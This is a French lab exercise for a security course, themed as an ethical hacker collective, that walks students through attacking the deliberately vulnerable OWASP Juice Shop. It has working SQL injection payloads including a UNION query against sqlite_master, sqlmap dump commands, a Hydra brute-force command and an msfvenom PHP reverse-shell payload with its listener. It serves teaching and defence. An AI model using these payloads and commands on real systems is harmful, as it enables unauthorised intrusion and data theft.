---
layout: default
title: "Groupe Spectre"
nav_order: 7
has_toc: true
published: false
---

# Exercice : Groupe Spectre
## Exercice — Analyse offensive d’un système exposé

---

## Mise en situation

Au cours des dernières semaines, une nouvelle plateforme de commerce en ligne très populaire a discrètement attiré l’attention de certains membres de la communauté en cybersécurité. Rien d’officiel : aucun rapport publié, aucun avis de sécurité. Seulement des observations ici et là, difficilement vérifiables, mais suffisamment intrigantes pour susciter des doutes.

Certains utilisateurs mentionnent des comportements étranges. D’autres parlent de validations incohérentes. Dans quelques cas, des réponses inattendues du système laissent croire que certaines parties de l’application ne réagissent pas comme elles le devraient.

Rien de suffisant pour tirer des conclusions, mais assez pour éveiller la curiosité.

---

Vous faites partie d’un collectif peu connu, opérant en marge des processus traditionnels.

Un groupe sans mandat ni reconnaissance officielle.

Le groupe **Spectre**.

### Spectre

**Spectre** n’est pas une organisation formelle. Il n’existe ni structure, ni hiérarchie clairement établie. Il s’agit plutôt d’un réseau informel d’analystes et de chercheurs en sécurité qui partagent une même conviction : il vaut mieux comprendre les vulnérabilités galopantes sur l'Internet avant qu'elles ne soient exploitées par des gens ou des groupes mal intentionnés.

Les membres de Spectre n’interviennent pas à la demande d’un client, mais ils opèrent toujours de manière éthique : ils ne publient pas leurs découvertes à la légère. Leur approche repose sur une règle simple : observer, expérimenter, comprendre sans jamais perturber inutilement, ni exposer publiquement ce qui pourrait être utilisé à mauvais escient.

Dans ce contexte, vous démarrez une copie contrôlée de l’application suspecte en laboratoire afin de valider certaines de vos hypothèses. Aucune documentation ne vous est remise. Aucune indication ne vous est donnée sur les failles potentielles. Aucun objectif précis ne vous est imposé.


- Chaque comportement inattendu est un indice.  
- Chaque validation insuffisante est une opportunité.  
- Chaque hypothèse incorrecte du système est une faille potentielle.


Saurez-vous utiliser les mêmes outils que les *hackers* mal intentionnés afin d'aider les créateurs de la plateforme à corriger les vulnérabilités avant que le chaos n'éclate ?

---

## Objectifs


## Préparation

### 1. Lancez OWASP Juice Shop
Dans votre VM applicative, démarrez OWASP Juice Shop

```bash
cd juice-shop
npm install
npm start
```

### 2. Vérifiez la connectivité

L'application vulnérable OWASP Juice Shop devrait être disponible aux adresses suivantes :

- Sur la VM applicative : `http://localhost:3000`
- À partir de la VM de sécurité offensive (Kali) : `http://<ip de votre VM applicative>:3000`

### 3. Explorez OWASP Juice Shop

- Explorez la plateforme de commerce en ligne en utilisant ses diverses fonctionnalités.
- Certaines vulnérabilités vous sauteront peut-être déjà aux yeux...

---

## 1. Observer la surface d’attaque

Avant toute interaction, un attaquant cherche à comprendre ce qui est visible.  
Chaque service exposé représente une opportunité.

### Outils

- nmap  
- whatweb  

### Objectif

Identifier les points d’entrée accessibles depuis l’extérieur.


### Étapes

1. Identifiez l’adresse IP du serveur Juice Shop.

2. Lancez un scan des ports :

```bash
nmap -sV <IP>
```

Cette commande permet de :
- détecter les ports ouverts  
- identifier les services et leurs versions  

3. Notez soigneusement :

- Quels ports sont ouverts ?  
- Quel service écoute sur ces ports ?  
- Le port utilisé par l’application web est-il standard (80/443) ou non ?  

4. Analysez maintenant l’application web elle-même :

```bash
whatweb http://<IP>:3000
```

### Questions de réflexion

1. Quelles technologies semblent utilisées ?  
1. Pourquoi ces informations peuvent-elles aider un attaquant ?  

---

## 2. Intercepter et manipuler le trafic 

Un attaquant ne se limite jamais à utiliser une interface.  
Il observe les échanges… puis les modifie.

### Outil

- Burp Suite

### Objectif

Comprendre comment les données sont envoyées au serveur et comment il y répond.


### Étapes

1. Configurez Burp Suite

  - Lancez Burp Suite  
  - Activez **Intercept ON**  
  - Configurez votre navigateur pour passer par le proxy Burp  
  - Accédez à Juice Shop  


1. Interceptez une connexion

  - Accédez au formulaire de connexion  
  - Entrez des identifiants quelconques  
  - Interceptez la requête  

    Vous devriez observer une requête semblable à :

    ```json
    POST /rest/user/login
    {
      "email": "...",
      "password": "..."
    }
    ```

1. Modifiez le trafic

  - Avant d’envoyer la requête au serveur, modifiez les valeurs suivantes.


    - **Test 1 — Mot de passe très long**

      ```text
      aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
      ```

      Observez si le serveur limite la taille.


    - **Test 2 — Mot de passe vide**

      ```text
      "password": ""
      ```

      Le serveur refuse-t-il explicitement la valeur ?


    - **Test 3 — Injection SQL**

      ```text
      ' OR 1=1--
      ```

      Le système traite-t-il cette valeur comme du texte ou comme une instruction ?


    - **Test 4 — Modifier la structure JSON**

      Essayez de :
      - supprimer le champ "password"  
      - renommer "email" en "user"  
      - ajouter un champ supplémentaire (ex: "role":"admin")  

      Objectif : tester la validation côté serveur.


4. Manipulez une recherche

  - Interceptez une requête similaire à :

    ```http
    GET /rest/products/search?q=apple
    ```

    Modifiez la valeur :

    ```text
    q=' OR 1=1--
    ```

### Questions de réflexion

- Les résultats changent-ils ?  
- Le serveur vérifie-t-il l’entrée côté serveur ?  
- Que suppose le système sur vos données ?  


## 3. Découvrir du contenu caché

Un attaquant ne se limite pas à ce qui est visible dans l’interface.

### Outil

- gobuster

### Objectif

Découvrir des chemins et endpoints cachés.


### Étapes
1. Lancez la commande suivante

  ```bash
  gobuster dir -u http://<IP>:3000 -w /usr/share/wordlists/dirb/common.txt
  ```

1. Observez...

- Quels chemins sont trouvés ?  
- Quels codes HTTP sont retournés (200, 403, 401) ?  

### Questions de réflexion

- Pourquoi ces pages ne sont-elles pas exposées ?
- Le fait de cacher une route est-il un mécanisme de sécurité valable ? Pourquoi ?

---



## 4. Intercepter des requêtes vulnérables

Lorsque l'on intercepte du trafic, il est parfois possible de déceler des informations internes de l'application qui ne devraient pas être divulguées et qui renseignent les *hackers* sur la présence d'une vulnérabilité potentielle...

### Outil

- Burp Suite

### Objectif

Intercepter du trafic révélant la présence d'une vulnérabilité (injection SQL) afin de l'exploiter ultérieurement.

### Étapes

1. Assurez-vous que Burp Suite est toujours activé comme proxy pour votre navigateur web
1. Dans la fonctionnalité de recherche (en haut à droite), utilisez la valeur `')`
1. Observez la réponse fournie par le serveur dans Burp Suite
1. Sauvegardez la requête dans un fichier nommé `request.txt`
1. Tentez d'exploiter la vulnérabilité pour exfiltrer tous les produits de la base de données
1. Sachant que, pour une base de données `sqlite`, le schéma `sqlite_master` existe et contient les métadonnées de la base de données
  - Essayez d'exploiter la vulnérabilité avec l'entrée suivante: 
    ```
    mavaleur'))%20union%20all%20select%201,2,3,sql,5,6,7,8,9%20from%20sqlite_master%20--%20
    ```
  - Que fait la requête ci-haut ? 
  - Pourquoi l'information ainsi exfiltrée peut être utile pour un *hacker* ?


{: .astuce-title}
> Vous en voulez plus ?
>
> Pour plus de plaisir avec l'injection SQL, essayez quelques valeurs "classiques" dans le formulaire de connexion, telles que :
>```sql
>' OR 1=1--
>" OR 1=1--
>1 OR 1=1
>```
>
> Qu'observez-vous ?


### Questions de réflexion 

- Pourquoi est-il important d'éviter de retourner des messages d'erreurs trop détaillés ?
- Comment ces messages peuvent-ils être utilisés par les *hackers* ?

---

## 5. Automatisation d'une attaque

Lorsqu'une faille a été détectée, il existe plusieurs outils permettant d'automatiser son exploitation, ce qui accélère grandement l'attaque et rend la vulnérabilité plus dangereuse.

### Outil

- sqlmap

### Objectif

Observer comment une injection SQL peut être exploitée automatiquement.


### Étapes

#### 1. Analyse avec SQLMap

Analysez la requête SQL vulnérable capturée précédemment à l'aide de l'outil `sqlmap`

```bash
sqlmap -r request.txt --dbs
```

---

#### 2. Exploration avancée

Utilisez `sqlmap` pour analyser le schéma de la base de données complet

```bash
sqlmap -r request.txt --tables
sqlmap -r request.txt --dump
```

---

### Questions de réflexion

- SQLMap détecte-t-il automatiquement la vulnérabilité ?  
- Quelles actions aurait-il fallu réaliser manuellement ?  
- Pourquoi cet outil est-il particulièrement dangereux ?  

---

## 🔐 Exercice 6 — Attaque par brute force (Hydra)

Un système peut être techniquement robuste… mais vulnérable à cause des utilisateurs.

### 🎯 Objectif

Comprendre comment un attaquant teste automatiquement des mots de passe.

### 🧰 Outil

- hydra

### ⚙️ Étapes guidées

#### 1. Analyse du login avec Burp

Avant d’utiliser Hydra, vous devez comprendre la requête de connexion.

Interceptez une requête de login et identifiez :

- l’URL exacte (ex: /rest/user/login)  
- les paramètres envoyés (email, password)  
- le message d’erreur retourné en cas d’échec  

Exemple de message :

```text
Invalid email or password
```

---

#### 2. Construction de la commande Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/rest/user/login:email=^USER^&password=^PASS^:Invalid"
```

---

#### 3. Exécution

Lancez la commande et observez :

- le nombre de tentatives effectuées  
- la détection d’un mot de passe valide  

---

### 🧠 Analyse

- Pourquoi Hydra a besoin du message d’erreur ?  
- Quelles mesures pourraient empêcher cette attaque ?  

---

## 💣 Exercice 7 — Exploitation avec Metasploit

Un attaquant expérimenté automatise les étapes complexes.

### 🎯 Objectif

Comprendre le principe d’un reverse shell.

### ⚙️ Étapes guidées

#### 1. Lancer Metasploit

```bash
msfconsole
```

---

#### 2. Générer un payload

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.php
```

---

#### 3. Préparer un listener

```bash
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
run
```

---

#### 4. Exploitation

Cherchez une fonctionnalité dans l’application permettant :

- d’envoyer un fichier  
- de téléverser du contenu  

---

### 🧠 Analyse

- Que fait un reverse shell ?  
- Quelle faille est exploitée ?  

---

## 🎮 Exercice 8 — Exploration libre

À ce stade, aucun guide précis n’est fourni.

### 🎯 Objectif

Développer votre propre approche.

### ⚙️ Travail

- Combinez les outils  
- Testez différentes idées  
- Observez les réactions du système  

### 🧠 Analyse

- Qu’avez-vous découvert sans consigne spécifique ?  
- Quelle stratégie a été la plus efficace ?  

---

